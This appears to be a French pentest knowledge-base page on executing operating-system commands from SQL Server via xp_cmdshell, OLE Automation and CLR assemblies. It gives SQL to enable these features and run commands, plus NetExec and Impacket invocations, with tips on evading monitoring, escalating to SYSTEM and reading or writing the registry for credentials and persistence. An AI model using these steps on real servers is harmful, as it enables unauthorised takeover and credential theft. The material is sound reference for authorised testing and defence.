---
order: 3
title: "Exécution de commandes MSSQL : xp_cmdshell et autres sinks"
description: "Exécuter des commandes du système d'exploitation depuis SQL Server sous le compte de service via xp_cmdshell, les procédures d'automatisation OLE et les assemblys CLR, les principaux sinks qui transforment une session sysadmin en exécution de code sur l'hôte."
keywords:
  - xp_cmdshell
  - automatisation OLE
  - sp_OACreate
  - assembly CLR
  - MSSQL RCE
---

# Exécution de commandes

Avec sysadmin (ou un chemin vers celui-ci via l'[usurpation](impersonation.md) ou les [serveurs liés](linked-servers.md)), SQL Server exécute des **commandes du système d'exploitation sous son compte de service**. Il existe trois sinks principaux ; `xp_cmdshell` est le direct, l'automatisation OLE et CLR sont les solutions de repli lorsqu'il est verrouillé ou surveillé.

## xp_cmdshell

Désactivé par défaut, mais un sysadmin le réactive en deux instructions :

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

```bash
# Impacket and NetExec wrap the enable-and-run
mssqlclient.py ...   # then:  enable_xp_cmdshell   /   xp_cmdshell whoami
nxc mssql <target> -u sa -p pass --local-auth -x "whoami"   # -X for a PowerShell payload
```

## Automatisation OLE

Lorsque `xp_cmdshell` est indisponible, les procédures d'automatisation OLE instancient un shell WScript pour exécuter des commandes :

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @o INT;
EXEC sp_OACreate 'WScript.Shell', @o OUT;
EXEC sp_OAMethod @o, 'Run', NULL, 'cmd /c whoami > C:\out.txt';
```

## Assemblys CLR

Un sysadmin peut charger un assembly .NET qui expose une procédure exécutant du code in-process, ce qui évite de lancer `cmd.exe` et est plus discret :

```sql
-- load a CLR assembly from a hex blob or a reachable path, then call its procedure
-- tools: Invoke-SqlServer / PowerUpSQL Invoke-SQLOSCmd handle the assembly plumbing
```

## Notes d'exploitation

- Les commandes s'exécutent sous le **compte de service SQL Server**, donc le gain dépend de ce compte : souvent un compte de service peu privilégié (pivot via [token impersonation](../../directory/active-directory/authentication/credentials/token-impersonation.md), puisqu'il détient généralement `SeImpersonate`) ou parfois `LocalSystem` ou un compte de domaine.
- Préférez **CLR ou OLE** là où `xp_cmdshell` est surveillé ou bloqué par politique ; tous trois nécessitent sysadmin, atteignez donc sysadmin d'abord via l'usurpation ou les serveurs liés.
- `PowerUpSQL` `Invoke-SQLOSCmd` s'exécute spécifiquement via **xp_cmdshell** ; là où celui-ci est bloqué mais que OLE ou CLR est utilisable, exécutez ces instructions directement plutôt que de compter dessus.
- L'exécution de commandes plus le `SeImpersonate` du compte de service est la chaîne standard **MSSQL vers SYSTEM** sur l'hôte.
- Au-delà de l'exécution, un sysadmin peut lire et écrire le registre Windows avec `xp_regread`/`xp_regwrite` (secrets du compte de service, identifiants stockés, autoruns), une primitive plus discrète d'accès aux identifiants et de persistance.

## Outils

- **PowerUpSQL** (`Invoke-SQLOSCmd`) : exécution de commandes OS via xp_cmdshell (utilisez directement les instructions OLE/CLR là où xp_cmdshell est bloqué).
- **Impacket `mssqlclient.py`** (`enable_xp_cmdshell`) : activation et exécution interactives.
- **NetExec `mssql`** (`-x`/`-X`) : exécution de commandes et de PowerShell depuis le réseau.

## Références

- [NetExec: MSSQL command execution](https://www.hackingarticles.in/mssql-for-pentester-netexec/)
- [PowerUpSQL (NetSPI)](https://github.com/NetSPI/PowerUpSQL)
- [Microsoft: xp_cmdshell server configuration](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
